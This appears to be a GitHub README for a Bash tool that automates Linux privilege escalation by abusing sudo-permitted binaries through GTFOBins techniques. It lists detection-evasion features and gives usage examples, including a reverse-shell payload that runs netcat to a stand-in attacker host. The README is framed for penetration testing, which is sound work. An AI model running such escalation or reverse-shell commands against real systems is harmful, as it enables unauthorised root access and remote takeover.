# 🚀✨ AutoGTFOBins Privilege Escalation Tool ✨🚀

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

An advanced automated tool for privilege escalation on Linux systems by exploiting sudo binary permissions using GTFOBins techniques.

Created by [Mrx0rd](https://github.com/Wael-Rd)

![GTFOBins Privilege Escalation Tool](https://github.com/Wael-Rd/GTFOBins-Remastred/blob/main/Screenshot.png)

## Overview

The AutoGTFOBins Privilege Escalation Tool is a comprehensive Bash script that automates the process of identifying and exploiting sudo binary permissions to gain root access on Linux systems. It leverages the techniques documented in [GTFOBins](https://gtfobins.github.io/) to automatically test and exploit vulnerable binaries.

### Key Features

- **Automated Exploitation**: Automatically identifies and exploits sudo binary permissions
- **Parallel Execution**: Tests multiple exploits simultaneously for faster results
- **Interactive Mode**: Allows manual selection of binaries and exploit methods
- **Stealth Mode**: Reduces output and system impact to avoid detection
- **Self-Update**: Can update exploit techniques directly from GTFOBins
- **Randomization**: Randomizes exploit attempts to evade detection
- **Custom Payloads**: Supports custom command execution instead of default shells
- **Environment Awareness**: Adapts techniques based on container detection and system resources
- **Comprehensive Logging**: Detailed logs of all activities for later analysis

## Installation

```bash
# Clone the repository
git clone git@github.com:Wael-Rd/GTFOBins-Remastred.git

# Navigate to the directory
cd GTFOBins-Remastred

# Make the script executable
chmod +x auto-gtfobins-privesc.sh
```

## Usage

### Basic Usage

Run the script without any arguments to automatically detect and exploit sudo permissions:

```bash
./auto-gtfobins-privesc.sh
```

### Command-line Options

```bash
Usage: ./auto-gtfobins-privesc.sh [options]
Options:
  -i, --interactive    Run in interactive mode
  -s, --stealth        Run in stealth mode (reduced output)
  -u, --update         Update exploits from GTFOBins
  -r, --randomize      Randomize exploit attempts
  -p, --parallel N     Run N exploits in parallel (default: 3)
  -t, --timeout N      Set timeout for exploits in seconds (default: 5)
  --payload 'CMD'      Use custom payload instead of /bin/sh
  -h, --help           Show this help message
```

### Examples

#### Run in Interactive Mode

```bash
./auto-gtfobins-privesc.sh -i
```

This allows you to select specific binaries and exploit methods to try.

#### Run in Stealth Mode

```bash
./auto-gtfobins-privesc.sh -s
```

Reduces output and system impact to minimize detection risk.

#### Custom Parallel Execution and Timeout

```bash
./auto-gtfobins-privesc.sh -p 5 -t 10
```

Runs 5 exploits in parallel with a 10-second timeout for each attempt.

#### Use a Custom Payload

```bash
./auto-gtfobins-privesc.sh --payload 'nc -e /bin/bash attacker.com 4444'
```

Executes a custom command instead of spawning a shell.

## How It Works

1. The script first checks for sudo permissions using `sudo -l`
2. It extracts the list of allowed binaries from the output
3. For each binary, it checks if there's a known GTFOBins exploitation technique
4. It attempts to execute the exploit techniques in parallel
5. If successful, it provides a root shell or executes the specified payload

## Supported Binaries

The tool supports a wide range of binaries documented in GTFOBins, including but not limited to:

- Shell execution: bash, dash, zsh, ksh, etc.
- File operations: cat, cp, mv, find, etc.
- Editors: vim, nano, emacs, etc.
- Programming languages: python, perl, ruby, php, etc.
- Network tools: curl, wget, nc, etc.
- Package managers: apt, pip, etc.

## Security Considerations

This tool is designed for security professionals, penetration testers, and system administrators to test and secure their systems. Unauthorized use on systems without explicit permission is illegal and unethical.

## Contribution

Contributions are welcome! Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

This tool is provided for educational and professional security testing purposes only. The authors are not responsible for any misuse or damage caused by this tool.

## Acknowledgements

- [GTFOBins](https://gtfobins.github.io/) for documenting these techniques
- [Mrx0rd](https://github.com/Wael-Rd) - Creator and maintainer
- All contributors to the project
